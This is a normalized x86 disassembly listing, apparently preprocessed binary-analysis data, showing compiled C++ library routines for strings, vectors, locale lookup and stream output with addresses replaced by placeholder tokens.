push edi
push 0x4
mov [ esi ] r--data
call sub_41775f
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
push 0x1
mov [ edi ] 0x0
call sub_416a83
add esp 0x4
mov [ edi ] eax
jmp r-xdata
lea eax [ esi + 0x4 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x14 ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x34 ] edi
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
lea ecx [ esi + 0x8 ]
mov [ esi + 0x10 ] ecx
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ esi + 0x20 ]
pop edi
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov eax [ esi + 0xc ]
mov [ eax ] 0x0
mov eax [ esi + 0x1c ]
mov [ eax ] 0x0
mov eax [ esi + 0x2c ]
mov [ eax ] 0x0
mov eax esi
pop esi
retn
sub_40dab0
push ebp
mov ebp esp
mov eax [ ecx + 0x34 ]
push esi
mov ecx [ eax ]
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
mov edx [ ecx ]
call [ edx + 0x4 ]
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40dad0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
cmp [ edx + 0x14 ] 0x10
mov esi [ edx + 0x10 ]
push edi
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x10
mov edi [ ecx + 0x10 ]
jb r-xdata
mov edx [ edx ]
mov eax esi
cmp edi esi
cmovb eax edi
push eax
call sub_408880
mov ecx eax
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ ecx ]
xor eax eax
test ecx ecx
pop edi
setne al
pop esi
pop ebp
retn 0x8
cmp edi esi
jae r-xdata
xor ecx ecx
cmp edi esi
setne cl
or ecx 0xffffffff
test ecx ecx
pop edi
setne al
pop esi
pop ebp
retn 0x8
sub_40db70
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
push esi
mov edx [ ebx + 0x8 ]
mov esi 0x1
test edx edx
cmovne esi edx
mov eax 0xaaaaaaa
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_41682d
add esi esi
jmp r-xdata
sub esi edx
push edi
mov edi [ ebx + 0xc ]
lea eax [ edx + esi ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax esi
sub eax edx
cmp eax 0x1
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shl eax 0x2
lea edx [ ecx + edi * 4 ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x8 ]
sar eax 0x2
lea edi [ eax * 4 ]
mov eax [ ebp - 0x4 ]
push edi
push edx
lea eax [ eax + ecx * 4 ]
push eax
call sub_4170d0
mov ecx [ ebp - 0x8 ]
add esp 0xc
lea edx [ edi + eax ]
mov [ ebp - 0xc ] edx
cmp ecx esi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov ecx [ ebx + 0x4 ]
lea edi [ esi * 4 ]
mov eax edi
and eax 0xfffffffc
push eax
push ecx
push edx
call sub_4170d0
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
mov edi [ ebp - 0x8 ]
lea edx [ edi * 4 ]
sub edx ecx
add edx eax
sar edx 0x2
lea edi [ edx * 4 ]
push edi
push ecx
push [ ebp - 0x4 ]
call sub_4170d0
add esp 0x18
add edi eax
test esi esi
je r-xdata
mov edx [ ebx + 0x4 ]
lea eax [ ecx * 4 ]
mov edi esi
sub edi ecx
sar eax 0x2
mov [ ebp - 0x10 ] edi
lea edi [ eax * 4 ]
push edi
push edx
push [ ebp - 0xc ]
call sub_4170d0
mov ecx [ ebp - 0x10 ]
add esp 0xc
add edi eax
test ecx ecx
je r-xdata
call sub_4167fc
shl eax 0x2
push eax
call sub_41775f
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
pop edi
test eax eax
je r-xdata
mov ecx esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor eax eax
[ edi ]
add [ ebx + 0x8 ] esi
mov eax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0x4 ] eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_417912#2
add esp 0x4
mov edi [ ebp - 0x4 ]
mov ecx eax
jmp r-xdata
xor eax eax
[ edi ]
sub_40dce0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
cmp eax edx
jb r-xdata
push r--data
call sub_41685b
mov ebx [ ebp + 0x10 ]
sub eax edx
mov edx [ esi + 0x10 ]
cmp eax ebx
cmovb ebx eax
or eax 0xffffffff
sub eax edx
cmp eax ebx
jbe r-xdata
push r--data
call sub_41682d
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ edx + ebx ]
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_4018d0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax [ ebp + 0xc ]
add eax ecx
push ebx
push eax
mov eax [ esi + 0x10 ]
add eax edx
push eax
call sub_41a1a0
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_40ddf0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebx ]
mov eax ecx
sub eax edx
push edi
mov edi [ ebp + 0x10 ]
sar eax 0x2
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
test edi edi
je r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
pop edi
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x8 ]
pop ebx
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
mov ebx [ ebx + 0x4 ]
mov eax [ eax + 0x8 ]
sub eax ebx
sar eax 0x2
push esi
cmp eax edi
jae r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
mov eax ebx
mov esi [ esi ]
sub eax ecx
sar eax 0x2
sub esp 0x8
mov edx ebx
cmp eax edi
jae r-xdata
sub ebx edx
sar ebx 0x2
mov eax 0x3fffffff
sub eax ebx
cmp eax edi
jb r-xdata
lea eax [ edi * 4 ]
mov edi ebx
sub edi eax
push ebx
mov ecx edi
mov [ ebp + 0x14 ] eax
call sub_40f360
mov ecx [ ebp - 0x4 ]
add esp 0x10
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp eax edi
je r-xdata
shl edi 0x2
mov [ ebp + 0x14 ] esi
lea eax [ edi + ecx ]
push eax
call sub_40f360
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebx + 0x4 ]
add esp 0x10
lea eax [ ebp + 0x14 ]
push [ ebp + 0xc ]
sub esp 0x8
push eax
mov eax ecx
sub eax [ ebp + 0xc ]
sar eax 0x2
sub edx eax
call sub_40f210
add [ ebx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
sub ecx edi
add esp 0x10
cmp eax ecx
je r-xdata
push r--data
call sub_41682d
lea eax [ ebx + edi ]
mov ebx [ ebp - 0x4 ]
push eax
mov ecx ebx
call sub_40e040
xor esi esi
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
lea ecx [ edx + eax ]
cmp eax ecx
je r-xdata
sub ebx edi
jmp r-xdata
pop esi
mov [ eax ] esi
add eax 0x4
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax 0x3fffffff
ja r-xdata
mov ebx [ ebp - 0x4 ]
lea ebx [ ebx ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov [ ebx + edi ] eax
mov eax [ ebp + 0xc ]
cmp eax edi
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx ] esi
lea eax [ esi + eax * 4 ]
mov [ ebx + 0x8 ] eax
lea eax [ esi + edi * 4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
push ecx
call j_sub_417912#2
add esp 0x4
call sub_4167fc
lea ecx [ eax * 4 ]
push ecx
call sub_41775f
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov [ eax ] esi
mov ecx [ ebp + 0xc ]
add eax 0x4
add ecx edx
cmp eax ecx
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ ebp + 0xc ]
sub eax [ ebx ]
sub esp 0x8
sar eax 0x2
push [ ebp + 0x14 ]
lea ecx [ esi + eax * 4 ]
mov edx edi
mov [ ebp - 0x8 ] eax
call sub_40f210
mov edx [ ebp + 0xc ]
mov ecx [ ebx ]
add esp 0x10
push [ ebp + 0xc ]
sub esp 0x8
push esi
call sub_40f360
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebp + 0xc ]
add esp 0x10
add eax edi
push [ ebp + 0xc ]
lea eax [ esi + eax * 4 ]
sub esp 0x8
push eax
call sub_40f360
mov ecx [ ebx ]
mov eax [ ebx + 0x4 ]
sub eax ecx
sar eax 0x2
add esp 0x10
add edi eax
test ecx ecx
je r-xdata
sub_40e000
push ebp
mov ebp esp
push 0x24
call sub_41775f
add esp 0x4
test eax eax
je r-xdata
call sub_4167fc
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx eax
mov edx eax
jmp r-xdata
pop ebp
retn 0x8
mov [ ecx ] edx
mov [ eax ] ecx
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub_40e040
push ebp
mov ebp esp
mov edx [ ecx + 0x8 ]
sub edx [ ecx ]
mov eax 0x3fffffff
sar edx 0x2
mov ecx edx
shr ecx 0x1
sub eax ecx
cmp eax edx
jae r-xdata
add edx ecx
cmp edx [ ebp + 0x8 ]
cmovb edx [ ebp + 0x8 ]
mov eax edx
pop ebp
retn 0x4
xor edx edx
cmp edx [ ebp + 0x8 ]
cmovb edx [ ebp + 0x8 ]
mov eax edx
pop ebp
retn 0x4
sub_40e080
push ebp
mov ebp esp
push 0xffffffff
push sub_4302e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] esi
call sub_4168c1
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x1c ] ebx
test edi edi
jne r-xdata
mov ecx [ esi ]
cmp edi [ ecx + 0xc ]
jae r-xdata
push edi
lea ecx [ ebp - 0x14 ]
call sub_4168c1
cmp [ rw-data ] edi
jne r-xdata
xor esi esi
mov eax [ ecx + 0x8 ]
mov esi [ eax + edi * 4 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_41691d
mov edi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
call sub_416a7d
cmp edi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
call sub_41691d
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ eax + 0x8 ]
mov esi [ eax + edi * 4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
push [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_408b40
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
mov esi [ ebp - 0x1c ]
mov [ rw-data ] esi
mov edx [ esi ]
mov ecx esi
call [ edx + 0x4 ]
push esi
call sub_416a55
add esp 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_418af2
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_41a87b
sub_40e1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_430240
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edx
mov ebx ecx
mov eax [ ebx ]
mov edx [ edx + 0x10 ]
mov ecx [ eax + 0x4 ]
xor edi edi
mov eax [ ecx + ebx + 0x24 ]
mov esi [ ecx + ebx + 0x20 ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] edx
test eax eax
jl r-xdata
xor esi esi
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
cmp [ eax + ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
mov [ ebp - 0x2c ] eax
cmp esi edx
jbe r-xdata
test esi esi
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx + 0xc ] 0x0
sete al
mov [ ebp - 0x2c ] al
mov [ ebp - 0x4 ] 0x1
test al al
jne r-xdata
mov ecx [ eax + ebx + 0x3c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x2c ] eax
sub esi edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx + ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edi 0x4
jmp r-xdata
call sub_40b3f0
mov ecx [ ecx + ebx + 0x38 ]
mov [ ebp - 0x30 ] ebx
test ecx ecx
je r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx + 0x14 ] 0x10
jb r-xdata
lea esp [ esp ]
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
add ecx ebx
test edi edi
je r-xdata
mov eax [ ebx ]
push 0x0
mov eax [ eax + 0x4 ]
push [ ebp - 0x24 ]
mov ecx [ eax + ebx + 0x38 ]
push edx
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
call eax
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov edx [ edx ]
test edi edi
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
mov dl [ eax + ebx + 0x40 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x11 ] dl
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call j_sub_41c24d
mov esi [ ebp - 0x30 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test edx edx
jne r-xdata
test esi esi
je r-xdata
movzx eax dl
mov edx [ ecx ]
push eax
call [ edx + 0xc ]
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40d980
and eax 0x17
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ eax + ebx + 0x20 ] 0x0
mov [ eax + ebx + 0x24 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
mov dl [ eax + ebx + 0x40 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x11 ] dl
cmp [ eax ] 0x0
je r-xdata
dec esi
jmp r-xdata
or edi 0x4
mov [ ebp - 0x20 ] edi
mov edx [ ecx + 0x30 ]
dec eax
mov [ edx ] eax
mov ecx [ ecx + 0x20 ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov al [ ebp - 0x11 ]
mov [ edx ] al
movzx eax al
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
call [ edx + 0x8 ]
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x18 ] rw-data
push eax
test cl 0x4
je r-xdata
movzx eax dl
mov edx [ ecx ]
push eax
call [ edx + 0xc ]
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
test eax eax
jle r-xdata
test esi esi
je r-xdata
cmp eax 0xffffffff
jne r-xdata
test cl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_408d70
push r--data
lea eax [ ebp - 0x5c ]
push eax
call sub_41a87b
dec esi
jmp r-xdata
or edi 0x4
jmp r-xdata
mov edx [ ecx + 0x30 ]
dec eax
mov [ edx ] eax
mov ecx [ ecx + 0x20 ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov al [ ebp - 0x11 ]
mov [ edx ] al
movzx eax al
jmp r-xdata
push r--data
lea ecx [ ebp - 0x70 ]
call sub_408d70
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_41a87b
push r--data
lea ecx [ ebp - 0x48 ]
call sub_408d70
push r--data
lea eax [ ebp - 0x48 ]
push eax
call sub_41a87b
cmp eax 0xffffffff
jne r-xdata
sub_40e378
mov ecx [ ebp - 0x28 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov eax [ edx + ecx + 0xc ]
add edx ecx
or eax 0x4
cmp [ edx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ edx + 0xc ] eax
test [ edx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax r-xdata
retn
push 0x1
mov ecx edx
call sub_408e40
sub_40e490
cmp [ edx ] 0x0
push esi
push edi
jne r-xdata
mov esi edx
lea edi [ esi + 0x1 ]
xor esi esi
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi edi
cmp [ ecx + 0x14 ] 0x10
mov edi [ ecx + 0x10 ]
jb r-xdata
mov eax esi
cmp edi esi
cmovb eax edi
push eax
call sub_408880
mov ecx eax
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ ecx ]
xor eax eax
test ecx ecx
pop edi
sete al
pop esi
retn
cmp edi esi
jae r-xdata
xor ecx ecx
cmp edi esi
setne cl
or ecx 0xffffffff
test ecx ecx
pop edi
sete al
pop esi
retn
sub_40e4f0
push ebp
mov ebp esp
push 0xffffffff
push sub_430279
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax edx
mov [ ebp - 0x14 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
mov ebx [ eax + 0x10 ]
mov [ ebp - 0x10 ] 0x1
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
lea eax [ ecx + ebx ]
mov ebx [ esi + 0x10 ]
cmp ebx eax
ja r-xdata
push 0xffffffff
push 0x0
push [ ebp - 0x14 ]
mov ecx esi
call sub_40dce0
cmp [ edi ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
push 0x1
push eax
mov ecx esi
call sub_401800
test al al
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
mov ecx esi
call sub_40d810
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ebx ] 0x0
sub_40e5e0
push ebp
mov ebp esp
push ecx
mov eax [ edx + 0x14 ]
push esi
mov esi [ edx + 0x10 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
sub eax esi
mov [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx edx
call sub_40dce0
mov esi eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ ecx + 0x14 ]
sub eax [ ecx + 0x10 ]
cmp eax esi
jb r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
sub esp 0x8
push edx
push ecx
call sub_40eb10
push eax
mov ecx edi
call sub_40b140
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov eax edi
pop edi
mov [ esi ] 0x0
pop esi
mov esp ebp
pop ebp
retn
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40e690
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov edi ecx
mov ecx edx
mov [ ebp - 0x4 ] 0x0
call sub_40dce0
mov esi eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov eax edi
pop edi
mov [ esi ] 0x0
pop esi
mov esp ebp
pop ebp
retn
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40e710
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x1
mov edi ecx
push r--data
mov ecx edx
mov [ ebp - 0x4 ] 0x0
call sub_40d810
mov esi eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov eax edi
pop edi
mov [ esi ] 0x0
pop esi
mov esp ebp
pop ebp
retn
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40e790
cmp [ edx ] 0x0
push esi
push edi
jne r-xdata
mov esi edx
lea edi [ esi + 0x1 ]
xor esi esi
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi edi
cmp [ ecx + 0x14 ] 0x10
mov edi [ ecx + 0x10 ]
jb r-xdata
mov eax esi
cmp edi esi
cmovb eax edi
push eax
call sub_408880
mov ecx eax
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ ecx ]
xor eax eax
test ecx ecx
pop edi
setne al
pop esi
retn
cmp edi esi
jae r-xdata
xor ecx ecx
cmp edi esi
setne cl
or ecx 0xffffffff
test ecx ecx
pop edi
setne al
pop esi
retn
sub_40e7f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4302b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax 0xb
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
push 0xb
push r--data
mov ecx esi
call sub_40d810
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_40dce0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_401800
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_40e8b0
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ ebp + 0xc ]
sub esp 0x8
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push ecx
push [ esi + 0x4 ]
push esi
call sub_40f390
mov ecx [ rw-data ]
mov edx eax
mov eax 0x71c71c6
sub eax ecx
cmp eax 0x1
jb r-xdata
push r--data
call sub_41682d
inc ecx
mov [ rw-data ] ecx
mov [ esi + 0x4 ] edx
mov eax [ edx + 0x4 ]
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
push eax
lea ecx [ eax + 0x8 ]
push ecx
lea eax [ ebp - 0x8 ]
push eax
mov ecx rw-data
call sub_40efd0
mov ecx [ eax ]
mov [ edi ] ecx
mov cl [ eax + 0x4 ]
mov [ edi + 0x4 ] cl
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_40e930
push ebp
mov ebp esp
push 0xffffffff
push sub_4302e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] esi
call sub_4168c1
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x1c ] ebx
test edi edi
jne r-xdata
mov ecx [ esi ]
cmp edi [ ecx + 0xc ]
jae r-xdata
push edi
lea ecx [ ebp - 0x14 ]
call sub_4168c1
cmp [ rw-data ] edi
jne r-xdata
xor esi esi
mov eax [ ecx + 0x8 ]
mov esi [ eax + edi * 4 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_41691d
mov edi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
call sub_416a7d
cmp edi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
call sub_41691d
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ eax + 0x8 ]
mov esi [ eax + edi * 4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
push [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40ea60
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
mov esi [ ebp - 0x1c ]
mov [ rw-data ] esi
mov edx [ esi ]
mov ecx esi
call [ edx + 0x4 ]
push esi
call sub_416a55
add esp 0x4
push r--data
